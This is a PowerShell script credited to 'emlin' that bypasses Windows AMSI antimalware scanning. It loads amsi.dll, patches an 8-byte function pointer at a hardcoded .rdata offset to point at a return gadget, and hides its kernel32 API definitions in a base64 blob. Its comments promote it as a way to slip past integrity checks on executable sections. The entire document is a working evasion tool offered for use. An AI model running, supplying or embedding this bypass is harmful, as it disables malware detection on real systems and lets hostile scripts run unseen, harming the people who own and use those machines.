<#
amsi bypass by emlin

this overwrites the address of a sub-function call to return instantly (0xC3 gadget)
what makes this special is the fact that it does not do any .text patches and instead
relies only on a single .rdata patch (8 bytes) which means it will bypass
any integrity checks on the executable sections of amsi.dll
#>

<# definition for getprocaddress, getmodulehandle, virtualprotect, touint64, tointptr #>
$wapidef = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String(@"
W0RsbEltcG9ydCgia2VybmVsMzIiKV0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZG
RyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwpbRGxsSW1wb3J0KCJrZXJuZWwzMiIp
XQpwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwpbRGxsSW
1wb3J0KCJrZXJuZWwzMiIpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KFVJ
bnQ2NCBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbH
BmbE9sZFByb3RlY3QpOwpwdWJsaWMgc3RhdGljIFVJbnQ2NCBUb1VJbnQ2NChJbnRQdHIgdmFsdWUpe3Jl
dHVybiAoVUludDY0KXZhbHVlO30KcHVibGljIHN0YXRpYyBJbnRQdHIgVG9JbnRQdHIoVUludDY0IHZhbH
VlKXtyZXR1cm4gKEludFB0cil2YWx1ZTt9
"@))
$wapi = Add-Type -MemberDefinition $wapidef -Name "wapi" -Namespace wapi -PassThru

$tmp = 0

# pointer to amsi.dll
$amsi_ptr = $wapi::LoadLibrary("amsi.dll")

# pointer to actual scan function (we will modify this)
$__scan_ptr = $wapi::ToUInt64($amsi_ptr) + 0x12250

# pointer to our return gadget
$gadget_ptr = $wapi::ToIntPtr($wapi::ToUInt64($wapi::GetProcAddress($amsi_ptr, "DllUnregisterServer")) + 5)

# make memory page writable (protection flags: readonly -> readwrite)
$wapi::VirtualProtect($__scan_ptr, [uint32]8, 0x04<#PAGE_READWRITE#>, [ref]$tmp)

# overwrite the pointer to the scan function with our gadget pointer.
[System.Runtime.InteropServices.Marshal]::WriteInt64($wapi::ToIntPtr($__scan_ptr), $gadget_ptr)

